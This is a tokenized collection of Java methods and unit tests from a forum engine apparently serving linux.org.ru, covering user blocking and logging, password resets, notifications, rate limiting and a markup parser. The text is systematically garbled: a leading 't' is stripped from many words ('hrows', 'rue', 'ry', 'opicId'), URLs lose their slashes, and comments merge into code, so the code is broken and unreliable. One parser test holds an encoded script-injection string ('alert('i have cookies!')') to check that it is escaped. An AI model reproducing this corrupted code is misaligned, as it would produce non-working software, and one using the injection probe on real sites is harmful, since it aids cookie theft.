public void estEmpty ( ) { assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [b] [br][/b][u] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [list][*][br][br][*][u][/u][/list] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [url] [/url][list][*][br][br][*][u][/u][/list][/url] " ) ) ; assertFalse ( lorCodeService . isEmptyTextComment ( " [code]text[/code] " ) ) ; } 
public void logResetUserpic ( User user , User actionUser , int bonus ) { ImmutableMap < String , Object > options ; if ( bonus ! = 0 ) { options = ImmutableMap . < String , Object > of ( " bonus " , bonus , " old_userpic " , user . getPhoto ( ) ) ; } else { options = ImmutableMap . < String , Object > of ( " old_userpic " , user . getPhoto ( ) ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public UserLogDao userLogDao ( ) { return new UserLogDao ( ) ; } 
public ImageDao imageDao ( ) { return new ImageDao ( ) ; } 
public SectionService sectionService ( ) { return new SectionService ( ) ; } 
public SectionDao sectionDao ( ) { return new SectionDaoImpl ( ) ; } 
public UserLogDao userLogDao ( ) { return mock ( UserLogDao . class ) ; } 
public IgnoreListDao ignoreListDao ( ) { return mock ( IgnoreListDao . class ) ; } 
public UserTagDao userTagDao ( ) { return new UserTagDao ( ) ; } 
public void logResetUserpic ( @Nonnull User user , @Nonnull User actionUser , int bonus ) { ImmutableMap < String , Object > options ; if ( bonus ! = 0 ) { options = ImmutableMap . < String , Object > of ( " bonus " , bonus , OPTION_OLD_USERPIC , user . getPhoto ( ) ) ; } else { options = ImmutableMap . < String , Object > of ( " old_userpic " , user . getPhoto ( ) ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . block ( user , moderator , reason ) ; List < Integer > deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public void estBlock ( ) hrows UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . block ( user , user , " " ) ; User userAfter = userDao . getUser ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public void estCacheResetOnBlock ( ) hrows UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . block ( user , user , " " ) ; User userAfter = userDao . getUserCached ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public void block ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; userLogDao . logBlockUser ( user , moderator , reason ) ; } 
public void unblock ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , user . getId ( ) ) ; userLogDao . logUnblockUser ( user , moderator ) ; } 
public void logBlockUser ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logUnblockUser ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( " JB " ) ; userDao . unblock ( user , user ) ; } 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user ) ; userDao . unblock ( user , user ) ; } 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized! " ) ; } User user = mpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { hrow new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( configuration . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { hrow new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user , newEmail ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
public void acceptNewEmail ( @Nonnull User user , @Nonnull String newEmail ) { jdbcTemplate . update ( " UPDATE users SET email=?, new_email=null WHERE id=? " , newEmail , user . getId ( ) ) ; userLogDao . logAcceptNewEmail ( user , newEmail ) ; } 
public void logAcceptNewEmail ( @Nonnull User user , @Nonnull String newEmail ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
private void rescueMaxcom ( ) hrows Exception { final User user = userDao . getUser ( " maxcom " ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
public void removeUserInfo ( User user , User moderator ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . rim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user . getId ( ) , null ) ; changeScore ( user . getId ( ) , - 10 ) ; userLogDao . logResetInfo ( user , moderator , userInfo , - 10 ) ; } 
public void logResetUserpic ( @Nonnull User user , @Nonnull User actionUser , int bonus ) { ImmutableMap < String , Object > options ; if ( bonus ! = 0 ) { options = ImmutableMap . < String , Object > of ( OPTION_BONUS , bonus , OPTION_OLD_USERPIC , user . getPhoto ( ) ) ; } else { options = ImmutableMap . < String , Object > of ( OPTION_OLD_USERPIC , user . getPhoto ( ) ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logResetInfo ( @Nonnull User user , @Nonnull User moderator , @Nonnull String userInfo , int bonus ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; userLogDao . logResetPassword ( user , user ) ; return setPassword ( user , password ) ; } 
public void resetPassword ( User user , User moderator ) { setPassword ( user , StringUtil . generatePassword ( ) ) ; userLogDao . logResetPassword ( user , moderator ) ; } 
public void logResetPassword ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void updateUser ( @Nonnull User user , String name , String url , String new_email , String own , @Nullable String password , String info ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, new_email=?, town=? WHERE id=? " , name , url , new_email , own , user . getId ( ) ) ; if ( password ! = null ) { setPassword ( user , password ) ; userLogDao . logSetPassword ( user ) ; } setUserInfo ( user . getId ( ) , info ) ; } 
public void logSetPassword ( @Nonnull User user ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public UserLogItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new UserLogItem ( rs . getInt ( " id " ) , 
public DataSourceTransactionManager ransactionManager ( DataSource ds ) { return new DataSourceTransactionManager ( ds ) ; } 
public void estLogAcceptEmail ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( UserDaoIntegrationTest . TEST_ID ) ; when ( user . getEmail ( ) ) . henReturn ( " old@email " ) ; userLogDao . logAcceptNewEmail ( user , " est@email " ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user ) ; Assert . assertEquals ( 1 , logItems . size ( ) ) ; UserLogItem item = logItems . get ( 0 ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . ACCEPT_NEW_EMAIL , item . getAction ( ) ) ; } 
public User apply ( EditHistoryDto input ) { return userDao . getUserCached ( input . getEditor ( ) ) ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = configuration . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { ry { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( FileNotFoundException e ) { logger . error ( " Image not found! id={}: {} " , item . getImage ( ) . getId ( ) , e . getMessage ( ) ) ; } catch ( BadImageException | IOException e ) { logger . error ( " Bad image id={} " , item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > opicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; ImmutableList < String > ags = opicTagService . getMessageTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem opic = new TopicsListItem ( author , rs , messagesInPage , ags ) ; opicsList . add ( opic ) ; } return opicsList ; } 
public BanInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { Timestamp date = resultSet . getTimestamp ( " bandate " ) ; String reason = resultSet . getString ( " reason " ) ; User moderator = getUser ( resultSet . getInt ( " ban_by " ) ) ; return new BanInfo ( date , reason , moderator ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } return ignoreMap ; } 
public List < PreparedUserLogItem > prepare ( @Nonnull List < UserLogItem > items ) { return ImmutableList . copyOf ( Lists . ransform ( items , new Function < UserLogItem , PreparedUserLogItem > ( ) { 
public PreparedUserLogItem apply ( UserLogItem item ) { return new PreparedUserLogItem ( item , userDao . getUserCached ( item . getActionUser ( ) ) ) ; } 
public void estLogAcceptEmail ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( UserDaoIntegrationTest . TEST_ID ) ; when ( user . getEmail ( ) ) . henReturn ( " old@email " ) ; userLogDao . logAcceptNewEmail ( user , " est@email " ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , rue ) ; Assert . assertEquals ( 1 , logItems . size ( ) ) ; UserLogItem item = logItems . get ( 0 ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . ACCEPT_NEW_EMAIL , item . getAction ( ) ) ; } 
public void brTest ( ) { assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false , false ) ) ; } 
public void boldTest ( ) { assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false , false ) ) ; } 
public void italicTest ( ) { assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false , false ) ) ; } 
public void strikeoutTest ( ) { assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false , false ) ) ; } 
public void emphasisTest ( ) { assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false , false ) ) ; } 
public void quoteTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false , false ) ) ; } 
public void urlTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false , false ) ) ; } 
public void urlParamTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false , false ) ) ; } 
public void listTest ( ) { assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; 
public void codeCleanTest ( ) { assertEquals ( " " , lorCodeService . parseComment ( " [code][/code] " , false , false ) ) ; } 
public void codeKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=cxx]#include <stdio.h>[/code] " , false , false ) ) ; 
public void codeUnKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=foo]#include <stdio.h>[/code] " , false , false ) ) ; 
public void overflow1Test ( ) { assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false , false ) ) ; 
public void spacesTest ( ) { assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false , false ) ) ; 
public void userTest ( ) { assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , false ) ) ; assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , false ) ) ; assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , rue , false ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void cut4Test ( ) { assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false , false ) ) ; 
public void estHighlightURL ( ) { assertEquals ( " <p><a href= \" http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E \" >http:ya.ru/?a=f&lt;script&gt;alert('i have cookies!')&lt;/script&gt;</a></p> " , lorCodeService . parseComment ( " http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E " , false , false ) ) ; } 
public boolean apply ( String s ) { return isBox ( s ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public HttpEntity < LoginStatus > loginAjax ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) { UsernamePasswordAuthenticationToken oken = new UsernamePasswordAuthenticationToken ( username , password ) ; ry { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
private HttpEntity < LoginStatus > entity ( LoginStatus status ) { HttpHeaders headers = new HttpHeaders ( ) ; headers . add ( " Access-Control-Allow-Origin " , configuration . getMainUrlWithoutSlash ( ) ) ; headers . add ( " Access-Control-Allow-Credentials " , " rue " ) ; return new HttpEntity < > ( status , headers ) ; } 
private void doResize ( File uploadedFile ) hrows IOException , BadImageException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public static void resizeImage ( String filename , String iconname , int size ) hrows IOException , BadImageException { ry { BufferedImage source = ImageIO . read ( new File ( filename ) ) ; 
public int saveNewMessage ( final Topic msg , final User user , String ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message, bbcode) values (?,?, ?)", msgid, text, true ); return msgid; } 
public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public void addUserRefEvent ( Iterable < User > users , int opicId , int commentId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addUserRefEvent ( Iterable < User > users , int opicId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addUserTagEvent ( Iterable < Integer > userIdList , int opicId ) { for ( int userId : userIdList ) { userEventDao . addEvent ( 
public void delete ( Topic message ) hrows UserErrorException { jdbcTemplate . update ( updateDeleteMessage , message . getId ( ) ) ; } 
public void deleteTopicEvents ( int opicId , ImmutableSet < String > ypes ) { for ( String ype : ypes ) { jdbcTemplate . update ( 
public void addReplyEvent ( User parentAuthor , int opicId , int commentId ) { userEventDao . addEvent ( ANSWERS . getType ( ) , 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , UserEventFilterEnum eventFilter ) { String eventFilterType = null ; if ( eventFilter ! = ALL ) { eventFilterType = eventFilter . getType ( ) ; } return userEventDao . getRepliesForUser ( user . getId ( ) , showPrivate , opics , offset , eventFilterType ) ; } 
public void processTopicDeleted ( Topic opic ) { userEventDao . deleteTopicEvents ( opic . getId ( ) , ImmutableSet . of ( 
public void estAdd ( ) { createSimpleEvent ( ) ; List < UserEvent > events = userEventDao . getRepliesForUser ( TEST_USER_ID , rue , 50 , 0 , null ) ; assertEquals ( 1 , events . size ( ) ) ; } 
private void createSimpleEvent ( ) { userEventDao . addEvent ( UserEventFilterEnum . TAG . oString ( ) , 
public void estAddRemove ( ) { createSimpleEvent ( ) ; List < UserEvent > events = userEventDao . getRepliesForUser ( TEST_USER_ID , rue , 50 , 0 , null ) ; assertEquals ( 1 , events . size ( ) ) ; userEventDao . deleteTopicEvents ( TEST_TOPIC_ID , ImmutableSet . of ( UserEventFilterEnum . TAG . getType ( ) ) ) ; List < UserEvent > eventsAfterDelete = userEventDao . getRepliesForUser ( TEST_USER_ID , rue , 50 , 0 , null ) ; assertEquals ( 0 , eventsAfterDelete . size ( ) ) ; } 
public void estRemoveSyntax ( ) { userEventDao . deleteTopicEvents ( TEST_TOPIC_ID , ImmutableSet . of ( 
public UserEventDao userLogDao ( ) { return new UserEventDao ( ) ; } 
private synchronized boolean check ( String ip , boolean rusted ) { cleanup ( ) ; if ( hash . containsKey ( ip ) ) { DateTime date = hash . get ( ip ) ; if ( date . plusMillis ( ( rusted ? THRESHOLD_TRUSTED : THRESHOLD ) ) . isAfterNow ( ) ) { return false ; } } hash . put ( ip , new DateTime ( ) ) ; return rue ; } 
private synchronized void cleanup ( ) { for ( Iterator < DateTime > i = hash . values ( ) . iterator ( ) ; i . hasNext ( ) ; ) { DateTime date = i . next ( ) ; 
private boolean check ( String ip , boolean rusted ) { DateTime date = hash . getIfPresent ( ip ) ; if ( date ! = null ) { if ( date . plusMillis ( ( rusted ? THRESHOLD_TRUSTED : THRESHOLD ) ) . isAfterNow ( ) ) { return false ; } } hash . put ( ip , new DateTime ( ) ) ; return rue ; } 
private boolean check ( Action action , String ip , int hreshold ) { String key = action . oString ( ) + ':' + ip ; DateTime date = hash . getIfPresent ( key ) ; if ( date ! = null ) { if ( date . plusMillis ( hreshold ) . isAfterNow ( ) ) { return false ; } } hash . put ( key , new DateTime ( ) ) ; return rue ; } 
public void checkDuplication ( Action action , String ip , boolean rusted , Errors errors ) { int hreshold = rusted ? action . getThresholdTrusted ( ) : action . getThreshold ( ) ; if ( ! check ( action , ip , hreshold ) ) { errors . reject ( 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . block ( user , moderator , reason ) ; List < Integer > deletedTopicIds = opicService . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public void delete ( int msgid ) { jdbcTemplate . update ( updateDeleteMessage , msgid ) ; } 
private void deleteTopic ( int mid , User moderator , String reason , int bonus ) { opicDao . delete ( mid ) ; deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( mid ) ; } 
public void processTopicDeleted ( int msgid ) { userEventDao . deleteTopicEvents ( msgid , ImmutableSet . of ( 
public static String escapeXml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; switch ( s ) { case " &nbsp; " : res . append ( " &#160; " ) ; break ; default : res . append ( s ) ; break ; } i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public void processTitle ( ) { given when String actualResult = StringUtil.processTitle("one -- two --- three -- four-- five --six --"); then assertEquals("one&nbsp;&mdash; two --- three&nbsp;&mdash; four-- five --six --", actualResult); } 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then assertEquals("&#171;Test of &#8222;quotes &quot; &#8222;in quotes&#8221; in title&#8221;&#187;", actualResult); } 
public void escapeXml ( ) { assertEquals ( " est&#160;test&amp; " , StringUtil . escapeXml ( " est&nbsp;test&amp; " ) ) ; } 
public void insertTopicNotification ( final int opicId , Iterable < Integer > userIds ) { @SuppressWarnings ( " unchecked " ) Map < String , Object > [ ] batch = Iterables . oArray ( Iterables . ransform ( userIds , new Function < Integer , Map < String , Object > > ( ) { @Nullable @Override public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " opic " , opicId , " user " , userId ) ; } } ) , Map . class ) ; insertTopicUsersNotified . executeBatch ( batch ) ; } 
public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " opic " , opicId , " user " , userId ) ; } 
public void addUserRefEvent ( Iterable < Integer > users , int opicId ) { userEventDao . insertTopicNotification ( opicId , users ) ; for ( int user : users ) { userEventDao . addEvent ( 
public void addUserTagEvent ( Iterable < Integer > userIdList , int opicId ) { userEventDao . insertTopicNotification ( opicId , userIdList ) ; for ( int userId : userIdList ) { userEventDao . addEvent ( 
public void insertTopicNotification ( final int opicId , Iterable < Integer > userIds ) { @SuppressWarnings ( " unchecked " ) Map < String , Object > [ ] batch = Iterables . oArray ( Iterables . ransform ( userIds , new Function < Integer , Map < String , Object > > ( ) { @Nullable @Override public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " opic " , opicId , " userid " , userId ) ; } } ) , Map . class ) ; insertTopicUsersNotified . executeBatch ( batch ) ; } 
public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " opic " , opicId , " userid " , userId ) ; } 
public void estInsertTopicUserNotification ( ) { userEventDao . insertTopicNotification ( TEST_TOPIC_ID , ImmutableList . of ( TEST_USER_ID ) ) ; } 
public void estInsertTopicUserNotificationDup ( ) { userEventDao . insertTopicNotification ( TEST_TOPIC_ID , ImmutableList . of ( TEST_USER_ID ) ) ; userEventDao . insertTopicNotification ( TEST_TOPIC_ID , ImmutableList . of ( TEST_USER_ID ) ) ; } 
private int createTag ( String agName ) { SimpleJdbcInsert insert = new SimpleJdbcInsert ( jdbcTemplate ) . withTableName ( " ags_values " ) . usingGeneratedKeyColumns ( " id " ) ; return insert . executeAndReturnKey ( ImmutableMap . < String , Object > of ( " value " , agName ) ) . intValue ( ) ; } 
